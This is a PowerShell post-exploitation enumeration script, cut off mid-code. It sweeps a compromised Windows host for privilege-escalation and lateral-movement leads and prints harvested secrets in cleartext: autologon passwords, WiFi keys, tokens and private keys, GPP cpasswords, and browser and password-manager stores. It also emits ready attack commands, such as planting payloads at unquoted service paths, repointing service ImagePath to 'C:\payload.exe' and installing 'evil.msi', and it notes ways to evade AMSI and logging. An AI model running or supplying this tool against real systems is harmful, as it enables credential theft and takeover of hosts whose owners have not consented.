<#
  recce-enum.ps1 - thorough, READ-ONLY local enumeration for Windows.

  The on-target companion to recce: run this once you have a shell on a Windows
  host to surface privilege-escalation vectors, lateral-movement / pivot leads
  (WinRM, mapped drives, Kerberoast / AS-REP / unconstrained-delegation targets),
  restricted-environment escapes and persistence footholds, plus sensitive
  exposure (a winPEAS-style sweep). It changes NOTHING - only reads system state
  with built-in cmdlets / reg queries - so it is safe to run and does not behave like
  malware. No exploit code, no download, no obfuscation, no AMSI/Defender
  tampering. Being a plain read-only Get-* script is exactly why it does not
  match malware signatures; if an EDR still false-positives, coordinate an
  exclusion rather than evading it.

  Lines marked [!] are worth a closer look. Every [!] that maps to a known
  escalation path is repeated at the end under "How to exploit", tailored to the
  exact privilege / service / file found on THIS host, with concrete steps.

  The exploitation guidance points at EXISTING public tools and techniques
  (the Potato family, impacket, mimikatz, gpp-decrypt, public PoCs). It does not
  generate exploit code - you still run the referenced tool yourself, per ROE.

  Usage:
    powershell -ep bypass -File .\recce-enum.ps1 [-Quiet] [-OutFile report.txt]
      -SelfTest  pre-flight only: parse-check the script + report which sections
                 will run on this host. Runs NO enumeration - safe first step.
      -Quiet     findings only (skip the raw dumps)
      -OutFile   also write everything to a file
#>
[CmdletBinding()]
param([switch]$SelfTest, [switch]$Quiet, [string]$OutFile)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

function Emit($t){ if($OutFile){ $t | Out-File -Append -FilePath $OutFile -Encoding utf8 }; Write-Host $t }
function Sec($t){ Emit ""; Emit ("==== " + $t + " ====") }
function Info($t){ if(-not $Quiet){ Emit ("    " + $t) } }
function Finding($t){ Emit ("[!] " + $t) }
function RegGet($p,$n){ try{ (Get-ItemProperty -Path $p -Name $n).$n }catch{ $null } }

# --- exploitation-playbook accumulator ---------------------------------------
# Flag records a vector (+ the specific artifact) so the tailored "How to
# exploit" section renders only what actually fired on this host.
$script:PB = @()
function Flag($tag,$val){ $script:PB += [pscustomobject]@{ Tag = $tag; Val = "$val" } }
function PbHas($tag){ return @($script:PB | Where-Object { $_.Tag -eq $tag }).Count -gt 0 }
function PbVals($tag){ return @($script:PB | Where-Object { $_.Tag -eq $tag -and $_.Val } | Select-Object -ExpandProperty Val -Unique) }

function TestWritable($path){
  if(-not $path -or -not (Test-Path $path)){ return $false }
  try{
    $acl = Get-Acl $path
    $me  = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $ids = @($me.User.Value) + $me.Groups.Value
    foreach($ace in $acl.Access){
      if($ace.AccessControlType -ne 'Allow'){ continue }
      if($ids -notcontains $ace.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value){ continue }
      if($ace.FileSystemRights -match 'Write|Modify|FullControl|TakeOwnership|ChangePermissions'){ return $true }
    }
  }catch{}
  return $false
}

# Return the writable ancestor directory of $path (or $null), so a finding can name
# the EXACT folder to drop a payload in rather than "check the permissions".
function Get-WritableAncestor($path){
  $d = $path
  for($i=0; $i -lt 8 -and $d; $i++){
    if((Test-Path $d) -and (TestWritable $d)){ return $d }
    $parent = Split-Path $d -Parent
    if($parent -eq $d){ break }
    $d = $parent
  }
  return $null
}

# Unquoted-service-path intercepts: the exact exe paths Windows tries BEFORE the
# real target, each with the directory that must be writable to hijack it. This
# turns "unquoted path" into "drop your exe at C:\Program Files\Foo.exe".
function Get-UnquotedIntercepts($imagePath){
  if(-not $imagePath){ return @() }
  if($imagePath -match '^\s*"'){ return @() }                 # already quoted -> safe
  $m = [regex]::Match($imagePath, '^(.*?\.exe)', 'IgnoreCase')
  if(-not $m.Success){ return @() }
  $full = $m.Groups[1].Value
  if($full -notmatch ' '){ return @() }                       # no space -> not exploitable
  $res = @()
  $idx = 0
  while(($idx = $full.IndexOf(' ', $idx)) -ge 0){
    $cand = $full.Substring(0, $idx) + '.exe'
    $dir  = Split-Path $cand -Parent
    if($dir){ $res += [pscustomobject]@{ Exe=$cand; Dir=$dir; Writable=(TestWritable $dir) } }
    $idx++
  }
  return $res
}

# The clean service-binary path (drop quotes + trailing args), for writability +
# exact "copy over this file" guidance.
function Get-ServiceBinary($imagePath){
  if(-not $imagePath){ return $null }
  if($imagePath -match '^\s*"([^"]+)"'){ return $Matches[1] }
  $m = [regex]::Match($imagePath, '^(.*?\.exe)', 'IgnoreCase')
  if($m.Success){ return $m.Groups[1].Value }
  return ($imagePath -split '\s')[0]
}

# ============================================================ self-test (pre-flight)
if($SelfTest){
  Write-Host "recce-enum.ps1 self-test - verifies the script + host; runs NO enumeration"
  Write-Host ""
  # 1) Syntax: parse this very file with the PowerShell parser.
  if($PSCommandPath -and (Test-Path $PSCommandPath)){
    $perr = $null
    [System.Management.Automation.Language.Parser]::ParseFile($PSCommandPath, [ref]$null, [ref]$perr) | Out-Null
    if($perr -and $perr.Count){
      Write-Host ("[FAIL] " + $perr.Count + " syntax error(s):")
      $perr | ForEach-Object { Write-Host ("       L" + $_.Extent.StartLineNumber + ": " + $_.Message) }
    } else { Write-Host "[ OK ] script parses cleanly (no syntax errors)" }
  } else { Write-Host "[warn] cannot locate the script file to parse (run with -File)" }
  # 2) Host environment.
  Write-Host ("[info] PowerShell " + $PSVersionTable.PSVersion + " " + $PSVersionTable.PSEdition +
              " | policy=" + (Get-ExecutionPolicy) + " | lang=" + $ExecutionContext.SessionState.LanguageMode)
  $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  Write-Host ("[info] Elevated (admin): " + $admin + "   (elevated reads more; unelevated still works)")
  # 3) Command availability -> which section families will produce data here.
  $checks = [ordered]@{
    'System & patches'      = @('Get-CimInstance','Get-HotFix')
    'Users & groups'        = @('Get-LocalUser','Get-LocalGroupMember','net','quser')
    'Services & tasks'      = @('Get-CimInstance','Get-ScheduledTask')
    'Credentials'           = @('cmdkey','klist','netsh','reg')
    'Hardening / Defender'  = @('Get-MpComputerStatus','Get-BitLockerVolume','Get-AppLockerPolicy')
    'Network'               = @('ipconfig','netstat','Get-SmbShare','Get-NetFirewallProfile')
    'Lateral (AD/WinRM)'    = @('net','arp','Get-Service','Get-CimInstance')
    'Persistence hooks'     = @('Get-WmiObject','Get-ChildItem','Get-ItemProperty')
    'Core (always needed)'  = @('whoami','Get-ItemProperty','Get-Process')
  }
  foreach($k in $checks.Keys){
    $missing = @($checks[$k] | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) })
    if($missing.Count -eq 0){ Write-Host ("[ OK ] " + $k) }
    else { Write-Host ("[skip] " + $k + "  - missing: " + ($missing -join ', ') + " (those checks self-skip)") }
  }
  Write-Host ""
  Write-Host "Self-test complete. If the parse is OK, a real run is safe:  .\recce-enum.ps1"
  return
}

if($OutFile){ "" | Out-File -FilePath $OutFile -Encoding utf8 }
Emit ("recce-enum  host=" + $env:COMPUTERNAME + "  user=" + $env:USERNAME + "  " + (Get-Date))
Emit  "read-only local enumeration - nothing on this host is modified"

# ============================================================ system
Sec "System & patches"
$os = Get-CimInstance Win32_OperatingSystem
Info ("OS: " + $os.Caption + " (build " + $os.BuildNumber + ", " + $os.OSArchitecture + ")")
Info ("Installed: " + $os.InstallDate + "   LastBoot: " + $os.LastBootUpTime)
Info ("Domain: " + (Get-CimInstance Win32_ComputerSystem).Domain + "   Part-of-domain: " + (Get-CimInstance Win32_ComputerSystem).PartOfDomain)
$hf = Get-HotFix | Sort-Object InstalledOn -Descending
Info ("Hotfixes: " + $hf.Count + " installed; most recent:")
$hf | Select-Object -First 8 | ForEach-Object { Info ("   " + $_.HotFixID + "  " + $_.InstalledOn) }
Finding "Feed the OS build + hotfix list to Watson / WES-NG offline for missing-patch LPE candidates"
Flag WESNG ("build " + $os.BuildNumber)

# ============================================================ current context
Sec "Who am I / privileges (Potato preconditions)"
Info ("User: " + (whoami) + "   SID: " + ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)
$priv = (whoami /priv) 2>$null
$priv | Where-Object { $_ -match 'Se\w+Privilege' } | ForEach-Object { Info $_.Trim() }
$hasImp = ($priv -match 'SeImpersonatePrivilege\s+.*Enabled') -or ($priv -match 'SeAssignPrimaryTokenPrivilege\s+.*Enabled')
if($hasImp){
  Finding "SeImpersonate / SeAssignPrimaryToken held -> Potato to SYSTEM on patched Win10/11 & Server 2016-2022"
  Flag POTATO "SeImpersonate/SeAssignPrimaryToken"
}
if($priv -match 'SeBackupPrivilege\s+.*Enabled'){ Finding "SeBackupPrivilege -> read any file (SAM/SYSTEM/NTDS) -> hash dump"; Flag SEBACKUP 1 }
if($priv -match 'SeRestorePrivilege\s+.*Enabled'){ Finding "SeRestorePrivilege -> write any file / service hijack -> SYSTEM"; Flag SERESTORE "SeRestore" }
if($priv -match 'SeTakeOwnershipPrivilege\s+.*Enabled'){ Finding "SeTakeOwnershipPrivilege -> take ownership of protected objects"; Flag SERESTORE "SeTakeOwnership" }
if($priv -match 'SeManageVolumePrivilege\s+.*Enabled'){ Finding "SeManageVolumePrivilege -> arbitrary file create/write -> plant a DLL in System32 -> SYSTEM"; Flag SEMANAGEVOL 1 }
if($priv -match 'SeLoadDriverPrivilege\s+.*Enabled'){ Finding "SeLoadDriverPrivilege -> load a vulnerable driver (BYOVD) -> kernel"; Flag SELOADDRIVER 1 }
if($priv -match 'SeDebugPrivilege\s+.*Enabled'){ Finding "SeDebugPrivilege -> inject into / dump SYSTEM processes (LSASS)"; Flag SEDEBUG 1 }
if($priv -match 'SeCreateTokenPrivilege\s+.*Enabled'){ Finding "SeCreateTokenPrivilege -> forge a SYSTEM token directly"; Flag SECREATETOKEN 1 }
if($priv -match 'SeTcbPrivilege\s+.*Enabled'){ Finding "SeTcbPrivilege (act as part of the OS) -> build a SYSTEM token"; Flag SETCB 1 }
Info "Group membership:"
whoami /groups 2>$null | Where-Object { $_ -match 'S-1-|Administrators|BUILTIN' } | ForEach-Object { Info $_.Trim() }
if((whoami /groups) -match 'S-1-5-32-544'){ Finding "Current token is in the local Administrators group (may need a UAC bypass to use it)"; Flag ADMIN_TOKEN 1 }
# Process integrity level (Medium = UAC-limited; High/System = already elevated).
$il = (whoami /groups) 2>$null | Select-String 'Mandatory Level'
if($il){ Info ("Integrity level: " + ($il -replace '.*Mandatory Level\s*','' -split '\s{2,}')[0]) }

# ============================================================ users & groups
Sec "Users, groups & password policy"
Get-LocalUser | ForEach-Object { Info ("user: " + $_.Name + "  enabled=" + $_.Enabled + "  lastlogon=" + $_.LastLogon) }
Info "Local Administrators:"
Get-LocalGroupMember -Group "Administrators" 2>$null | ForEach-Object { Info ("   " + $_.Name) }
Info "Logged-on / sessions:"
(quser) 2>$null | ForEach-Object { Info $_ }
Info "Password policy:"
(net accounts) 2>$null | ForEach-Object { Info $_ }

# ============================================================ services
Sec "Services (unquoted paths, weak perms, writable binaries)"
$svcs = Get-CimInstance Win32_Service
foreach($s in $svcs){
  $p = $s.PathName
  if(-not $p){ continue }
  $acct = $s.StartName
  $priv = ($acct -match 'LocalSystem|NT AUTHORITY|LocalService|NetworkService') -or (-not $acct)
  # 1) Unquoted service path -> compute the EXACT writable intercept exe.
  if($p -notmatch '^\s*"' -and $p -match ' ' -and $p -notmatch '^\s*[A-Za-z]:\\Windows\\' -and $priv){
    $ic = Get-UnquotedIntercepts $p
    $w  = @($ic | Where-Object { $_.Writable })
    if($w.Count){
      foreach($c in $w){
        Finding ("Unquoted service path EXPLOITABLE: service '" + $s.Name + "' runs as " + $acct +
                 " -> plant your payload at  " + $c.Exe + "  (dir '" + $c.Dir + "' is writable), then: sc stop " + $s.Name + " & sc start " + $s.Name)
        Flag UNQUOTED ($s.Name + " || plant: " + $c.Exe + " || runs-as: " + $acct)
      }
    } else {
      Finding ("Unquoted service path: service '" + $s.Name + "' -> " + $p + " (" + $acct + ") - no intercept dir writable by THIS user (recheck under another account / after a foothold)")
      Flag UNQUOTED_INFO ($s.Name + " :: " + $p)
    }
  }
  # 2) Writable service binary -> the EXACT overwrite + restart.
  $bin = Get-ServiceBinary $p
  if($bin -and $bin -match '\.exe$' -and (TestWritable $bin)){
    Finding ("Writable service binary EXPLOITABLE: " + $bin + "  (service '" + $s.Name + "' runs as " + $acct + ") -> copy /Y payload.exe `"" + $bin + "`" ; sc stop " + $s.Name + " & sc start " + $s.Name)
    Flag SVC_BIN ($s.Name + " || overwrite: " + $bin + " || runs-as: " + $acct)
  }
}
# Writable service registry keys -> repoint ImagePath at your payload (EXACT cmd).
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services 2>$null | ForEach-Object {
  if(TestWritable $_.PSPath){
    $svc = $_.PSChildName
    Finding ("Writable service registry key EXPLOITABLE: " + $svc +
             " -> reg add HKLM\SYSTEM\CurrentControlSet\Services\" + $svc +
             " /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f ; then: sc start " + $svc)
    Flag SVC_REG ($svc + " || reg ImagePath -> C:\payload.exe")
  }
} | Select-Object -First 20

# ============================================================ scheduled tasks
Sec "Scheduled tasks (writable actions)"
Get-ScheduledTask 2>$null | Where-Object { $_.State -ne 'Disabled' } | ForEach-Object {
  $act = $_.Actions.Execute
  foreach($a in $act){
    if(-not $a){ continue }
    $exe = [System.Environment]::ExpandEnvironmentVariables($a) -replace '^"','' -replace '".*$',''
    if((Test-Path $exe) -and (TestWritable $exe)){
      Finding ("Writable scheduled-task binary: " + $exe + "  (task: " + $_.TaskName + ", run-as: " + $_.Principal.UserId + ")")
      Flag TASK_BIN ($_.TaskName + " :: " + $exe)
    }
  }
}

# ============================================================ AlwaysInstallElevated
Sec "AlwaysInstallElevated"
$aie1 = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' 'AlwaysInstallElevated'
$aie2 = RegGet 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' 'AlwaysInstallElevated'
if($aie1 -eq 1 -and $aie2 -eq 1){ Finding "AlwaysInstallElevated = 1 (HKLM+HKCU) -> install a malicious MSI as SYSTEM (msiexec /i evil.msi)"; Flag AIE 1 }
else { Info ("AlwaysInstallElevated HKLM=" + $aie1 + " HKCU=" + $aie2 + " (need BOTH =1)") }

# ============================================================ autoruns
Sec "Autoruns & startup"
$runKeys = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
             'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
             'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
foreach($k in $runKeys){
  (Get-Item $k).Property | ForEach-Object {
    $v = (Get-ItemProperty $k $_).$_
    Info ("$k  $_ = $v")
    $exe = ($v -replace '^"','' -replace '".*$','')
    if((Test-Path $exe) -and (TestWritable $exe)){ Finding ("Writable autorun binary: " + $exe); Flag AUTORUN $exe }
  }
}
foreach($sf in @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
                 "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup")){
  Get-ChildItem $sf 2>$null | ForEach-Object { Info ("startup item: " + $_.FullName) }
}

# ============================================================ credential hunting
Sec "Credential & secret hunting"
Info "Stored credentials (cmdkey):"
$ck = (cmdkey /list) 2>$null
$ck | ForEach-Object { Info $_ }
if($ck -match 'Target:'){ Flag STORED_CREDS "cmdkey vault" }
# Registry autologon.
$alu = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'DefaultUserName'
$alp = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'DefaultPassword'
if($alp){ Finding ("Autologon password in registry! user=" + $alu + " password=" + $alp); Flag AUTOLOGON ($alu + " / " + $alp) }
# Common secret-bearing files.
Info "Unattend / sysprep / config files:"
$credFiles = @("$env:WINDIR\Panther\Unattend.xml","$env:WINDIR\Panther\Unattended.xml",
  "$env:WINDIR\System32\Sysprep\sysprep.xml","$env:WINDIR\System32\Sysprep\sysprep.inf",
  "$env:WINDIR\system32\sysprep.inf","C:\unattend.xml","C:\sysprep.inf",
  "$env:WINDIR\debug\NetSetup.log","$env:ProgramData\McAfee\Common Framework\SiteList.xml")
foreach($f in $credFiles){ if(Test-Path $f){ Finding ("Sensitive file present: " + $f); Flag UNATTEND $f } }
# SAM/SYSTEM backups readable.
foreach($f in @("$env:WINDIR\repair\SAM","$env:WINDIR\System32\config\RegBack\SAM","$env:WINDIR\repair\SYSTEM")){
  if(Test-Path $f){ Finding ("Registry hive backup readable: " + $f + " -> offline hash extraction"); Flag SAM_BACKUP $f }
}
# HiveNightmare / SeriousSAM (CVE-2021-36934): live SAM/SYSTEM/SECURITY readable by non-admins.
$samLive = "$env:WINDIR\System32\config\SAM"
if(Test-Path $samLive){
  $ic = (icacls $samLive) 2>$null
  if($ic -match 'BUILTIN\\Users' -and $ic -match '\(R'){ Finding "HiveNightmare/SeriousSAM (CVE-2021-36934): live SAM readable by BUILTIN\Users -> dump SAM+SYSTEM from a VSS shadow copy"; Flag HIVE $samLive }
}
# PowerShell history.
$psh = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if(Test-Path $psh){ Info ("PowerShell history: " + $psh); if(-not $Quiet){ Get-Content $psh -Tail 25 | ForEach-Object { Info ("   >> " + $_) } } }
# Saved WiFi profiles + keys.
Info "WiFi profiles (key=clear shows the password):"
(netsh wlan show profiles) 2>$null | Select-String 'All User Profile' | ForEach-Object {
  $name = ($_ -split ':')[1].Trim()
  $key  = (netsh wlan show profile name="$name" key=clear | Select-String 'Key Content')
  if($key){ Finding ("WiFi " + $name + " -> " + ($key -split ':')[1].Trim()) }
}
# IIS web.config connection strings.
Info "IIS web.config search:"
Get-ChildItem C:\inetpub -Recurse -Filter web.config 2>$null | ForEach-Object {
  if(Select-String -Path $_.FullName -Pattern 'connectionString|password' -Quiet){ Finding ("Creds likely in: " + $_.FullName); Flag STORED_CREDS $_.FullName }
}
# Registry-wide password string search (bounded).
Info "Registry password search (bounded):"
foreach($rk in @('HKLM:\SOFTWARE','HKCU:\SOFTWARE')){
  reg query ($rk -replace ':','') /f password /t REG_SZ /s 2>$null | Select-Object -First 15 | ForEach-Object { Info $_ }
}
# Group Policy Preferences cpassword - AES key is public, so these decrypt to
# plaintext domain creds. Search SYSVOL (if reachable) + the local GPO cache.
Info "GPP cpassword search (Groups.xml / Services.xml / etc.):"
$gppPaths = @("$env:SystemRoot\SYSVOL", "$env:ProgramData\Microsoft\Group Policy\History",
              "$env:ALLUSERSPROFILE\Microsoft\Group Policy\History")
$dom = (Get-CimInstance Win32_ComputerSystem).Domain
if($dom -and $dom -ne 'WORKGROUP'){ $gppPaths += "\\$dom\SYSVOL" }
foreach($gp in $gppPaths){
  Get-ChildItem -Path $gp -Recurse -Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,Printers.xml,Drives.xml -ErrorAction SilentlyContinue |
    ForEach-Object {
      if(Select-String -Path $_.FullName -Pattern 'cpassword' -Quiet){
        Finding ("GPP cpassword in: " + $_.FullName + " -> gpp-decrypt the cpassword value"); Flag GPP $_.FullName
      }
    }
}
# DPAPI master keys + credential blobs (decrypt offline / with mimikatz on a lab).
Info "DPAPI master keys & credential blobs:"
foreach($dp in @("$env:APPDATA\Microsoft\Protect","$env:LOCALAPPDATA\Microsoft\Credentials",
                 "$env:APPDATA\Microsoft\Credentials","$env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Protect")){
  if(Test-Path $dp){ Get-ChildItem $dp -Force -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Info ("   " + $_.FullName) } }
}
# Kerberos tickets in the current session.
Info "Kerberos tickets (klist):"
(klist) 2>$null | Select-String 'Client|Server|#' | Select-Object -First 20 | ForEach-Object { Info $_.ToString().Trim() }
# Cloud / orchestration creds.
foreach($cd in @("$env:USERPROFILE\.aws\credentials","$env:USERPROFILE\.azure","$env:USERPROFILE\.config\gcloud",
                 "$env:USERPROFILE\.kube\config","$env:APPDATA\gcloud\credentials.db")){
  if(Test-Path $cd){ Finding ("Cloud/orchestration creds present: " + $cd); Flag CLOUD $cd }
}
# SCCM network-access account cache.
foreach($sc in @("$env:SystemRoot\ccmcache","HKLM:\SOFTWARE\Microsoft\SMS")){
  if(Test-Path $sc){ Info ("SCCM present: " + $sc + " (check for Network Access Account creds)") }
}
# App-specific stored sessions (often with recoverable passwords).
Info "App credential stores (PuTTY / WinSCP / OpenVPN / FileZilla / VNC):"
if(Test-Path 'HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions'){ Finding "PuTTY saved sessions present (check ProxyPassword / stored keys)"; Flag APP_CREDS "PuTTY sessions" }
if(Test-Path 'HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions'){ Finding "WinSCP saved sessions present -> passwords are recoverable"; Flag APP_CREDS "WinSCP sessions" }
foreach($fz in @("$env:APPDATA\FileZilla\sitemanager.xml","$env:APPDATA\FileZilla\recentservers.xml")){
  if(Test-Path $fz){ Finding ("FileZilla stored servers: " + $fz + " (Base64 passwords)"); Flag APP_CREDS $fz }
}
Get-ChildItem "$env:USERPROFILE\OpenVPN\config","$env:PROGRAMFILES\OpenVPN\config" -Filter *.ovpn -ErrorAction SilentlyContinue | ForEach-Object { Info ("OpenVPN config: " + $_.FullName) }
foreach($vnc in @('HKLM:\SOFTWARE\RealVNC\vncserver','HKLM:\SOFTWARE\TightVNC\Server','HKCU:\SOFTWARE\ORL\WinVNC3\Password')){
  if(Test-Path $vnc){ Finding ("VNC server config present: " + $vnc + " (recoverable password)"); Flag APP_CREDS $vnc }
}
# RDP saved connections + password-manager databases + browser creds.
if(Test-Path 'HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers'){
  Info "Saved RDP connections:"; (Get-ChildItem 'HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers').PSChildName | ForEach-Object { Info ("   " + $_) }
}
Get-ChildItem $env:USERPROFILE -Recurse -Include *.kdbx,*.kdb,*.psafe3,*.opvault -ErrorAction SilentlyContinue | ForEach-Object { Finding ("Password-manager DB: " + $_.FullName); Flag APP_CREDS $_.FullName } | Select-Object -First 10
foreach($br in @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
                 "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data")){
  if(Test-Path $br){ Finding ("Browser saved-login DB: " + $br + " (DPAPI-protected; decrypt on the host)"); Flag BROWSER_CREDS $br }
}
Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Recurse -Include logins.json,key4.db -ErrorAction SilentlyContinue | ForEach-Object { Finding ("Firefox creds: " + $_.FullName); Flag BROWSER_CREDS $_.FullName }
# SSH / PEM private keys in the profile (triaged: encrypted vs ready-to-use).
Get-ChildItem "$env:USERPROFILE\.ssh" -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'id_|identity|\.pem$|\.key$' } | ForEach-Object {
  $enc = Select-String -Path $_.FullName -Pattern 'ENCRYPTED' -Quiet
  Finding ("SSH/PEM private key: " + $_.FullName + $(if($enc){" (ENCRYPTED - ssh2john + john)"}else{" (UNENCRYPTED, ready to use)"})); Flag SSH_KEY $_.FullName
}
# Dev / cloud credential stores.
foreach($cf in @("$env:USERPROFILE\.git-credentials","$env:USERPROFILE\.netrc","$env:USERPROFILE\.npmrc",
                 "$env:USERPROFILE\.docker\config.json","$env:APPDATA\gcloud\credentials.db","$env:USERPROFILE\_netrc")){
  if(Test-Path $cf){ Finding ("Credential store file: " + $cf); Flag CRED_FILE $cf }
}
# IIS applicationHost.config connection strings / passwords.
$ah = "$env:WINDIR\System32\inetsrv\config\applicationHost.config"
if((Test-Path $ah) -and (Select-String -Path $ah -Pattern 'password|connectionString' -Quiet)){ Finding "IIS applicationHost.config holds credentials / connection strings"; Flag STORED_CREDS $ah }
# Scheduled-task XML with an embedded password.
Get-ChildItem "$env:WINDIR\System32\Tasks" -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 300 | ForEach-Object {
  if(Select-String -Path $_.FullName -Pattern '<Password>|LogonType>Password' -Quiet){ Finding ("Scheduled-task stored credential: " + $_.FullName); Flag STORED_CREDS $_.FullName }
}
# PowerShell transcripts + saved RDP files may capture typed credentials.
Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Filter 'PowerShell_transcript*' -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object { Info ("PS transcript (may hold typed creds): " + $_.FullName) }
Get-ChildItem $env:USERPROFILE -Recurse -Filter *.rdp -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object { Info ("saved RDP connection: " + $_.FullName) }
# High-signal secret sweep over the user profile (cloud keys / tokens / private keys / JWTs).
$hsre = 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|xox[baprs]-[0-9A-Za-z-]{10,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+|(password|secret|token|api[_-]?key)\s*[:=]\s*\S{4,}'
Get-ChildItem $env:USERPROFILE -Recurse -Include *.txt,*.xml,*.json,*.ps1,*.config,*.ini,*.yml,*.yaml,*.env -ErrorAction SilentlyContinue |
  Select-Object -First 400 | Select-String -Pattern $hsre -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {
    $ln = $_.Line.Trim(); if($ln.Length -gt 160){ $ln = $ln.Substring(0,160) }
    Finding ("Secret in " + $_.Path + ": " + $ln); Flag SECRETS_FOUND $_.Path
  }

# ============================================================ hardening state
Sec "OS hardening & defences"
$uac = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'EnableLUA'
Info ("UAC EnableLUA=" + $uac + "  (0 = UAC off)")
$wd = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' 'UseLogonCredential'
if($wd -eq 1){ Finding "WDigest UseLogonCredential=1 -> cleartext creds in LSASS memory"; Flag WDIGEST 1 }
$lsa = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'RunAsPPL'
Info ("LSA protection (RunAsPPL)=" + $lsa + "  (0/absent = LSASS not protected)")
try{ $dg = (Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
      Info ("Credential/Device Guard running services: " + ($dg -join ',')) }catch{}
try{ $mp = Get-MpComputerStatus; Info ("Defender: RealTime=" + $mp.RealTimeProtectionEnabled + " Tamper=" + $mp.IsTamperProtected) }catch{ Info "Defender status: n/a" }
Info ("Language mode: " + $ExecutionContext.SessionState.LanguageMode)
try{ (Get-AppLockerPolicy -Effective -Xml) | Out-Null; Info "AppLocker policy present (review allowed paths)" }catch{ Info "AppLocker: none/unavailable" }
# UAC detail (bypass surface) + token-filter policy (pass-the-hash local admin).
$cpa = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorAdmin'
$fat = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'FilterAdministratorToken'
$latfp = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'LocalAccountTokenFilterPolicy'
Info ("UAC ConsentPromptBehaviorAdmin=" + $cpa + "  FilterAdministratorToken=" + $fat)
if($latfp -eq 1){ Finding "LocalAccountTokenFilterPolicy=1 -> local admin accounts usable remotely (PtH-friendly)"; Flag LATFP 1 }
# PowerShell logging (if off, your activity is quieter; PSv2 dodges AMSI/CLM/logging).
$sbl = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' 'EnableScriptBlockLogging'
$ml  = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' 'EnableModuleLogging'
$tr  = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' 'EnableTranscripting'
Info ("PowerShell logging: ScriptBlock=" + $sbl + " Module=" + $ml + " Transcription=" + $tr)
if((Test-Path "$env:WINDIR\Microsoft.NET\Framework\v2.0.50727") -or (Test-Path "$env:WINDIR\Microsoft.NET\Framework64\v2.0.50727")){
  Info ".NET 2.0 present -> PowerShell v2 (powershell -v 2) downgrade dodges AMSI / SBL / CLM"
}
# LAPS (managed local-admin password) - reachable to some principals.
if((Test-Path "$env:ProgramFiles\LAPS\CSE\AdmPwd.dll") -or (RegGet 'HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd' 'AdmPwdEnabled')){
  Info "LAPS present -> if you can read ms-Mcs-AdmPwd in AD, you have the local admin password"
}
# BitLocker.
try{ (Get-BitLockerVolume -MountPoint C: 2>$null) | ForEach-Object { Info ("BitLocker C: " + $_.ProtectionStatus) } }catch{}
# NTLM / SMB posture.
$lmc = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'LmCompatibilityLevel'
Info ("LmCompatibilityLevel=" + $lmc + "  (<3 allows weak NTLM/LM)")
try{ Info ("SMB signing required(server)=" + (Get-SmbServerConfiguration).RequireSecuritySignature) }catch{}
# WSUS over HTTP -> attacker-in-the-middle can push a malicious update (SYSTEM).
$wus = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' 'WUServer'
if($wus){ Info ("WSUS server: " + $wus); if($wus -match '^http://'){ Finding ("WSUS over cleartext HTTP (" + $wus + ") -> WSUSpect / update injection to SYSTEM"); Flag WSUS $wus } }
# Print Spooler (PrintNightmare) surface.
$spool = Get-Service -Name Spooler -ErrorAction SilentlyContinue
if($spool -and $spool.Status -eq 'Running'){
